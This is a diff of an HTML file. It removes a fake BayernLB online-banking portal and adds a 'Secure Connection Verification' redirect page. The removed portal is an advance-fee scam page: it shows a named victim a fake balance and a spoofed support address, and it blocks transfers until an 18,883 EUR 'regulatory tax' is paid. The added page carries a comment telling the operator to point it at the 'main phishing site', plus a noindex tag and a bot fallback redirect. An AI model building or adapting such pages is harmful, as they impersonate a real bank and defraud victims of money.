@@ -1,315 +1,105 @@
 <!DOCTYPE html>
-<html lang="de" id="html-tag">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="robots" content="noindex, nofollow">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BayernLB - Online-Banking Portal</title>
+    <title>Secure Connection Verification</title>
     <style>
-        :root {
-            --blb-blue: #003366;
-            --blb-light-blue: #0059b3;
-            --blb-accent: #e5edf5;
-            --danger: #cc0000;
-            --success: #28a745;
-            --text: #333333;
-            --bg: #f0f2f5;
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background: #f4f6f9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
         }
 
-        body, html { margin: 0; padding: 0; font-family: "Arial", sans-serif; background: var(--bg); color: var(--text); height: 100%; }
+        .loader-container {
+            text-align: center;
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            width: 90%;
+            max-width: 400px;
+        }
 
-        /* --- LANGUAGE PICKER --- */
-        .lang-switcher { display: flex; gap: 10px; align-items: center; margin-right: 20px; }
-        .lang-btn { cursor: pointer; font-size: 12px; font-weight: bold; color: #666; padding: 5px; border: 1px solid #ccc; border-radius: 3px; background: #fff; text-transform: uppercase; }
-        .lang-btn.active { background: var(--blb-blue); color: #fff; border-color: var(--blb-blue); }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #e1e1e1;
+            border-top: 5px solid #003366; /* BayernLB Blue */
+            border-radius: 50%;
+            margin: 0 auto 20px auto;
+            animation: spin 1s linear infinite;
+        }
 
-        /* --- NAVIGATION --- */
-        #public-nav { background: #fff; padding: 15px 8%; display: flex; justify-content: space-between; align-items: center; border-bottom: 4px solid var(--blb-blue); position: sticky; top: 0; z-index: 1000; }
-        .logo { font-size: 28px; font-weight: bold; color: var(--blb-blue); letter-spacing: -1px; }
-        .logo span { color: var(--blb-light-blue); }
-        .nav-right { display: flex; align-items: center; }
-        .btn-portal { background: var(--blb-blue); color: white; padding: 10px 20px; border-radius: 2px; text-decoration: none; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 13px; }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
 
-        /* --- SECTIONS --- */
-        #home-section { display: block; }
-        .hero { height: 60vh; display: flex; align-items: center; justify-content: center; text-align: center; background: linear-gradient(rgba(0,51,102,0.7), rgba(0,51,102,0.7)), url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=1200') center/cover; color: white; }
-        .footer-addr { background: #fff; padding: 40px; text-align: center; border-top: 1px solid #ddd; font-size: 14px; color: #666; }
+        h2 {
+            color: #333;
+            font-size: 18px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
 
-        #login-section { display: none; height: 85vh; justify-content: center; align-items: center; }
-        .login-card { background: #fff; padding: 40px; border-top: 5px solid var(--blb-blue); width: 100%; max-width: 400px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); }
-        
-        #dashboard-container { display: none; height: 100vh; width: 100%; }
-        .sidebar { width: 260px; background: var(--blb-blue); height: 100vh; position: fixed; color: white; z-index: 10; }
-        .sidebar-brand { padding: 30px; font-size: 22px; font-weight: bold; border-bottom: 1px solid rgba(255,255,255,0.1); }
-        .sidebar-item { padding: 18px 30px; cursor: pointer; transition: 0.2s; font-size: 14px; border-bottom: 1px solid rgba(255,255,255,0.05); }
-        .sidebar-item:hover { background: var(--blb-light-blue); }
-        .sidebar-item.active { background: var(--blb-light-blue); font-weight: bold; }
-        
-        .main-view { margin-left: 260px; padding: 40px; width: calc(100% - 260px); box-sizing: border-box; min-height: 100vh; }
-        .page-view { display: none; }
-        .page-view.active { display: block; }
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 0;
+        }
 
-        .card { background: #fff; padding: 30px; margin-bottom: 30px; border: 1px solid #e1e1e1; }
-        .balance-val { font-size: 38px; font-weight: bold; color: var(--blb-blue); margin: 15px 0; }
-        
-        .form-group { margin-bottom: 20px; }
-        .form-group label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 8px; color: var(--blb-blue); }
-        .form-group input { width: 100%; padding: 12px; border: 1px solid #ccc; box-sizing: border-box; }
-        .btn-submit { width: 100%; padding: 15px; background: var(--blb-light-blue); color: white; border: none; font-weight: bold; cursor: pointer; }
-
-        table { width: 100%; border-collapse: collapse; }
-        th { background: #f8f9fa; padding: 15px; text-align: left; font-size: 12px; border-bottom: 2px solid #ddd; }
-        td { padding: 15px; border-bottom: 1px solid #eee; font-size: 14px; }
-        .amt-pos { color: var(--success); font-weight: bold; }
-        .amt-neg { color: var(--danger); font-weight: bold; }
-        
-        .error-banner { background: #fff0f0; color: #b30000; padding: 20px; border-left: 5px solid var(--danger); margin-bottom: 30px; display: none; }
+        .status {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #28a745;
+            font-weight: bold;
+            display: none;
+        }
     </style>
 </head>
 <body>
 
-<nav id="public-nav">
-    <div class="logo">Bayern<span>LB</span></div>
-    <div class="nav-right">
-        <div class="lang-switcher">
-            <div class="lang-btn active" id="btn-de" onclick="setLanguage('de')">DE</div>
-            <div class="lang-btn" id="btn-en" onclick="setLanguage('en')">EN</div>
-        </div>
-        <div class="btn-portal" id="txt-login-btn" onclick="showSection('login')">Online-Banking Login</div>
-    </div>
-</nav>
-
-<section id="home-section">
-    <div class="hero">
-        <div>
-            <h1 id="txt-hero-h1">Finanzpartner für den Fortschritt</h1>
-            <p id="txt-hero-p">Spezialisierte Finanzlösungen für institutionelle Kunden und Privatvermögen.</p><br>
-            <button class="btn-submit" id="txt-hero-btn" style="width:280px;" onclick="showSection('login')">Zum Kundenportal</button>
-        </div>
-    </div>
-    <div class="footer-addr">
-        <strong>Bayerische Landesbank (BayernLB)</strong><br>
-        Brienner Straße 18, 80333 München, Deutschland
-    </div>
-</section>
-
-<section id="login-section">
-    <div class="login-card">
-        <h2 id="txt-login-h2" style="color:var(--blb-blue); margin-top:0;">Anmeldung</h2>
-        <div class="form-group">
-            <label id="txt-label-user">BENUTZERNAME / KONTO-NR.</label>
-            <input type="text" id="user" placeholder="">
-        </div>
-        <div class="form-group">
-            <label id="txt-label-pass">PIN / PASSWORT</label>
-            <input type="password" id="pass" placeholder="••••••••">
-        </div>
-        <button class="btn-submit" id="txt-btn-auth" onclick="attemptLogin()">LOGIN BESTÄTIGEN</button>
-    </div>
-</section>
-
-<section id="dashboard-container">
-    <div class="sidebar">
-        <div class="sidebar-brand">BayernLB - Private</div>
-        <div class="sidebar-item active" id="nav-synth" onclick="navigateTo('synth')">Finanzstatus</div>
-        <div class="sidebar-item" id="nav-vire" onclick="navigateTo('vire')">Zahlungsverkehr</div>
-        <div class="sidebar-item" id="nav-cont" onclick="navigateTo('cont')">Kundenbetreuung</div>
-        <div class="sidebar-item" id="txt-logout" onclick="location.reload()" style="margin-top: 40px; opacity: 0.7;">Abmelden</div>
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <h2>Verifying Secure Connection...</h2>
+        <p>Establishing encrypted link to server.</p>
+        <div id="status-msg" class="status">Redirecting...</div>
     </div>
 
-    <div class="main-view">
-        <div id="page-synth" class="page-view active">
-            <h1 id="txt-dash-h1" style="color: var(--blb-blue);">Kontoübersicht - Herr Goran Larsson</h1>
-            <div class="card">
-                <span id="txt-balance-lbl" style="color:#666; font-size:13px; font-weight:bold;">GESAMT-SALDO</span>
-                <div class="balance-val">125,888.00 €</div>
-                <div id="txt-account-type" style="color:var(--blb-light-blue); font-weight:bold;">Privatkonto Premium n° 129942</div>
-            </div>
+    <script>
+        // CONFIGURATION: CHANGE THIS URL TO YOUR MAIN PHISHING SITE
+        // Example: 'https://your-main-domain.com/'
+        const TARGET_URL = 'portal.html'; 
 
-            <div class="card" style="padding:0;">
-                <div id="txt-trans-title" style="padding:20px; font-weight:bold; border-bottom:1px solid #eee;">Umsatzanzeige (Letzte 30 Tage)</div>
-                <table>
-                    <thead>
-                        <tr id="txt-table-head"><th>BUCHUNGSTAG</th><th>VERWENDUNGSZWECK</th><th>BETRAG</th></tr>
-                    </thead>
-                    <tbody id="trans-body">
-                        <!-- Content handled by JS -->
-                    </tbody>
-                </table>
-            </div>
-        </div>
+        // Time to wait before redirect (in milliseconds)
+        const WAIT_TIME = 2500; 
 
-        <div id="page-vire" class="page-view">
-            <h1 id="txt-vire-h1" style="color: var(--blb-blue);">SEPA-Überweisung</h1>
-            <div id="transfer-error" class="error-banner"></div>
-            
-            <div class="card" style="max-width: 700px;">
-                <div class="form-group">
-                    <label id="txt-vire-from">AUFTRAGSKONTO</label>
-                    <input type="text" id="vire-account-val" disabled style="background:#f0f0f0; color:var(--blb-blue); font-weight:bold;">
-                </div>
-                <div class="form-group">
-                    <label id="txt-vire-name">NAME DES EMPFÄNGERS</label>
-                    <input type="text">
-                </div>
-                <div class="form-group"><label>IBAN</label><input type="text"></div>
-                <div class="form-group"><label id="txt-vire-amt">BETRAG (€)</label><input type="number"></div>
-                <button class="btn-submit" id="txt-vire-btn" onclick="triggerVirementError()">ÜBERWEISUNG AUSFÜHREN</button>
-            </div>
-        </div>
+        // Optional: Show "Redirecting" text after 1 second
+        setTimeout(() => {
+            document.getElementById('status-msg').style.display = 'block';
+        }, 1000);
 
-        <div id="page-cont" class="page-view">
-            <h1 id="txt-cont-h1" style="color: var(--blb-blue);">Kontakt & Hilfe</h1>
-            <div class="card" style="max-width: 700px;">
-                <p id="txt-cont-p">Bei Fragen zu Ihren Konten wenden Sie sich bitte an Ihren Betreuer:</p>
-                <div style="border: 2px solid var(--blb-blue); padding: 30px; text-align: center;">
-                    <a href="mailto:banking@bayernSADSDASDS-group-support.com" style="font-size:20px; font-weight:bold; color:var(--blb-light-blue); text-decoration:none;">contact@lb-bayern.com</a>
-                </div>
-            </div>
-        </div>
-    </div>
-</section>
+        // Perform the redirect after the wait time
+        setTimeout(() => {
+            window.location.href = TARGET_URL;
+        }, WAIT_TIME);
 
-<script>
-    const langData = {
-        de: {
-            loginBtn: "Online-Banking Login",
-            heroH1: "Finanzpartner für den Fortschritt",
-            heroP: "Spezialisierte Finanzlösungen für institutionelle Kunden und Privatvermögen.",
-            heroBtn: "Zum Kundenportal",
-            loginH2: "Anmeldung",
-            userLbl: "BENUTZERNAME / KONTO-NR.",
-            passLbl: "PIN / PASSWORT",
-            authBtn: "LOGIN BESTÄTIGEN",
-            navSynth: "Finanzstatus",
-            navVire: "Zahlungsverkehr",
-            navCont: "Kundenbetreuung",
-            logout: "Abmelden",
-            dashH1: "Kontoübersicht - Herr Goran Larsson",
-            balanceLbl: "GESAMT-SALDO",
-            accType: "Privatkonto Premium n° 129942",
-            transTitle: "Umsatzanzeige (Letzte 30 Tage)",
-            tableHead: "<th>BUCHUNGSTAG</th><th>VERWENDUNGSZWECK</th><th>BETRAG</th>",
-            vireH1: "SEPA-Überweisung",
-            vireFrom: "AUFTRAGSKONTO",
-            vireName: "NAME DES EMPFÄNGERS",
-            vireAmt: "BETRAG (€)",
-            vireBtn: "ÜBERWEISUNG AUSFÜHREN",
-            contH1: "Kontakt & Hilfe",
-            contP: "Bei Fragen zu Ihren Konten wenden Sie sich bitte an Ihren Betreuer:",
-            err: "<strong>Transaktion abgelehnt:</strong> Unzureichende grenzüberschreitende regulatorische Steuer.<br><br>Erforderliche Zahlung für die grenzüberschreitende regulatorische Steuer: <strong>18.883,00 EUR</strong> Bitte kontaktieren Sie den Kundendienst.",
-            vireAccVal: "Privatkonto Premium (*942) - 125,888.00 €"
-        },
-        en: {
-            loginBtn: "Online Banking Login",
-            heroH1: "Financial Partner for Progress",
-            heroP: "Specialized financial solutions for institutional clients and private wealth.",
-            heroBtn: "To Customer Portal",
-            loginH2: "Sign In",
-            userLbl: "USERNAME / ACCOUNT NO.",
-            passLbl: "PIN / PASSWORD",
-            authBtn: "CONFIRM LOGIN",
-            navSynth: "Financial Status",
-            navVire: "Payments",
-            navCont: "Customer Support",
-            logout: "Logout",
-            dashH1: "Account Overview - Mr. Goran Larsson",
-            balanceLbl: "TOTAL BALANCE",
-            accType: "Private Premium Account n° 129942",
-            transTitle: "Transaction History (Last 30 Days)",
-            tableHead: "<th>DATE</th><th>DESCRIPTION</th><th>AMOUNT</th>",
-            vireH1: "SEPA Transfer",
-            vireFrom: "DEBIT ACCOUNT",
-            vireName: "BENEFICIARY NAME",
-            vireAmt: "AMOUNT (€)",
-            vireBtn: "EXECUTE TRANSFER",
-            contH1: "Contact & Help",
-            contP: "For questions regarding your accounts, please contact your advisor:",
-            err: "<strong>Transaction Declined:</strong> Insufficient Cross-Border Regulatory Tax.<br><br>Required Cross-Border Regulatory Tax call payment: <strong>18,883.00 EUR</strong>. Contact Customer Support.",
-            vireAccVal: "Private Premium Account (*942) - 125,888.00 €"
-        }
-    };
-
-    function setLanguage(l) {
-        const d = langData[l];
-        document.getElementById('html-tag').lang = l;
-        document.getElementById('btn-de').classList.toggle('active', l === 'de');
-        document.getElementById('btn-en').classList.toggle('active', l === 'en');
-        
-        document.getElementById('txt-login-btn').innerText = d.loginBtn;
-        document.getElementById('txt-hero-h1').innerText = d.heroH1;
-        document.getElementById('txt-hero-p').innerText = d.heroP;
-        document.getElementById('txt-hero-btn').innerText = d.heroBtn;
-        document.getElementById('txt-login-h2').innerText = d.loginH2;
-        document.getElementById('txt-label-user').innerText = d.userLbl;
-        document.getElementById('txt-label-pass').innerText = d.passLbl;
-        document.getElementById('txt-btn-auth').innerText = d.authBtn;
-        document.getElementById('nav-synth').innerText = d.navSynth;
-        document.getElementById('nav-vire').innerText = d.navVire;
-        document.getElementById('nav-cont').innerText = d.navCont;
-        document.getElementById('txt-logout').innerText = d.logout;
-        document.getElementById('txt-dash-h1').innerText = d.dashH1;
-        document.getElementById('txt-balance-lbl').innerText = d.balanceLbl;
-        document.getElementById('txt-account-type').innerText = d.accType;
-        document.getElementById('txt-trans-title').innerText = d.transTitle;
-        document.getElementById('txt-table-head').innerHTML = d.tableHead;
-        document.getElementById('txt-vire-h1').innerText = d.vireH1;
-        document.getElementById('txt-vire-from').innerText = d.vireFrom;
-        document.getElementById('txt-vire-name').innerText = d.vireName;
-        document.getElementById('txt-vire-amt').innerText = d.vireAmt;
-        document.getElementById('txt-vire-btn').innerText = d.vireBtn;
-        document.getElementById('txt-cont-h1').innerText = d.contH1;
-        document.getElementById('txt-cont-p').innerText = d.contP;
-        document.getElementById('vire-account-val').value = d.vireAccVal;
-        
-        // Update Transactions
-        const rows = `
-            <tr><td>09.09.2026</td><td>Crypto Market Security Commission / Barclays Bank<span class="details">GB97 0024 1153 8560 0000</span></td><td class="amt-pos">+125,888.00 €</td></tr>
-        `;
-        document.getElementById('trans-body').innerHTML = rows;
-    }
-
-    function showSection(id) {
-        document.getElementById('home-section').style.display = 'none';
-        document.getElementById('login-section').style.display = 'none';
-        document.getElementById('dashboard-container').style.display = 'none';
-        if(id === 'login') document.getElementById('login-section').style.display = 'flex';
-        else if(id === 'dash') {
-            document.getElementById('dashboard-container').style.display = 'flex';
-            document.getElementById('public-nav').style.display = 'none';
-        }
-        else document.getElementById('home-section').style.display = 'block';
-    }
-
-function attemptLogin() {
-    const userField = document.getElementById('user').value;
-    const passField = document.getElementById('pass').value;
-
-    // Validation for Account Number: 129942 and Password: Larsson123
-    if(userField === "129942" && passField === "Larsson123") {
-        showSection('dash');
-    } else {
-        alert("Login Error: Invalid credentials.");
-    }
-}
-
-    function navigateTo(p) {
-        document.querySelectorAll('.page-view').forEach(v => v.classList.remove('active'));
-        document.querySelectorAll('.sidebar-item').forEach(i => i.classList.remove('active'));
-        document.getElementById('page-' + p).classList.add('active');
-        document.getElementById('nav-' + p).classList.add('active');
-        document.getElementById('transfer-error').style.display = 'none';
-    }
-
-    function triggerVirementError() {
-        const errDiv = document.getElementById('transfer-error');
-        errDiv.innerHTML = langData[document.getElementById('html-tag').lang].err;
-        errDiv.style.display = 'block';
-        window.scrollTo(0, 0);
-    }
-    
-    // Default Init
-    setLanguage('de');
-</script>
+        // Fallback for bots (if they don't execute JS immediately)
+        // This meta tag forces a redirect if JS fails
+        // Note: We use a short delay to avoid "Too many redirects" errors
+        const metaRefresh = document.createElement('meta');
+        metaRefresh.httpEquiv = "refresh";
+        metaRefresh.content = "3;url=" + TARGET_URL;
+        document.head.appendChild(metaRefresh);
+    </script>
 
 </body>
 </html>
